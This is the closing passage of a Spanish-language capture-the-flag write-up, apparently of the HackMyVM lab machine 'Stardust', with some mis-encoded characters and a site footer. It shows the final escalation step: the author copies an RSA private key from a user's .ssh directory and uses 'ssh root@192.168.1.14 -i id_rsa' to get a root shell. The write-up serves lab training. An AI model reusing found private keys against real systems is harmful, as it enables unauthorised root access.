</span></span><span style="display:flex;"><span>drwx------  2 tally tally 4096 May  7 09:17 .ssh
</span></span></code></pre></div><p>Entro en el directorio <strong>.ssh</strong>, copio la llave <strong>rsa</strong> y me conecto como root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ ssh root@192.168.1.14 -i id_rsa
</span></span><span style="display:flex;"><span>Linux stardust.hmv 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
</span></span><span style="display:flex;"><span>root@stardust:~# id
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></div><p>Y aqu√≠ termina la m√°quina Stardust.</p>
<p>Saludos!</p>
<blockquote>
<p>Gracias al sr <strong>PL4GU3</strong> y <strong>Powerful</strong> por vuestra ayuda :)</p>
</blockquote>

            </div>
        </article>
    </main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2024 .
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
        theme on
        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    
    
    
    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>


    </body>
</html>
